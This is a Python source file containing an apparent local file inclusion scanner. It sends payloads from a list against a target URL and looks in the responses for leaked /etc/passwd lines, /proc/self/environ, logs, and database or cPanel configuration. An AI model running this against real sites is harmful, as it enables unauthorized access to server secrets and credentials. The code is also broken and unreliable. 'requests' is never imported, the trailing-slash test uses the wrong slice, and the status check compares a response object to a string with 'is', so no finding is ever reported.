import os
import time

def lfi_scanner(target , fuzzers , verbose = False , mod = print , logger = None) :
		if target[:-1] is not "/" :
			target = target + '/'
		if fuzzers is None : 
			try : 
				fuzz_file = open(os.path.join(os.getcwd() , 'core', "payloads" , "lfi.txt") , "r")
			except Exception as e : 
				mod		('[LFI SCANNER] Default Fuzz File Adding Error' , method = 'Error')
				mod		(e, method = 'Error')
				quit()
		else: 
			try : 
				fuzz_file = open(fuzzers,"r") 
			except Exception as e : 
				mod		('[LFI SCANNER] File Adding Error' , method = 'Error')
				mod		(e, method = 'Error')
		try : 
			for line in fuzz_file.read().split("\n"): 
				c = line.strip('\n')
				website = target + c
				status_code = 500
				try:
					#mod	(website , "Tring ...")
					r = requests.get(website, timeout=7, verify=False)
					content = (r.content)
					status_code = r
				except KeyboardInterrupt : 
					break
				except:
					mod	 ("[LFI SCANNER][!] Problem reaching ", website)
					time.sleep(0.5)
					content = ""
				if(status_code is '<Response [200]>'):
					if (b"[<a href='function.main'>function.main</a>" not in content
					 	and b"[<a href='function.include'>function.include</a>" not in content
					 	and (b"Failed opening" not in content and b"for inclusion" not in content)
					 	and b"failed to open stream:" not in content
					 	and b"open_basedir restriction in effect" not in content
					 	and (b"root:" in content or (b"sbin" in content and b"nologin" in content)
						or b"DB_NAME" in content or b"daemon:" in content or b"DOCUMENT_ROOT=" in content
						or b"PATH=" in content or b"HTTP_USER_AGENT" in content or b"HTTP_ACCEPT_ENCODING=" in content
						or b"users:x" in content or (b"GET /" in content and (b"HTTP/1.1" in content or b"HTTP/1.0" in content))
						or b"apache_port=" in content or b"cpanel/logs/access" in content or b"allow_login_autocomplete" in content
						or b"database_prefix=" in content or b"emailusersbandwidth" in content or b"adminuser=" in content
						or (b"error]" in content and b"[client" in content and "log" in website)
						or (b"[error] [client" in content and b"File does not exist:" in content and "proc/self/fd/" in website)
						or (b"State: R (running)" in content and (b"Tgid:" in content or b"TracerPid:" in content or b"Uid:" in content)
							and b"/proc/self/status" in website))): 
							mod		("\n[LFI Vulenerablity Found!]" , website , '\n')
					if("log" in website):
						mod	("[LFI SCANNER][log found]" , website)
					elif("/proc/self/environ" in website):
						mod	("[LFI SCANNER][/proc/self/environ" , "found]" , website)
					elif("/proc/self/fd" in website):
						mod	("[LFI SCANNER][/proc/self/fd" , "found]" , website)
					elif(".cnf" in website or ".conf" in website or ".ini" in website):
					 	mod	("[LFI SCANNER][ini/cnf/conf" , "found]" , website)
					else:
						pass
				
				else : 
					if verbose : 
						mod	('[LFI SCANNER][VERBOSE]' ,website , "Returns" , status_code)
		except KeyboardInterrupt : 
			exit() 
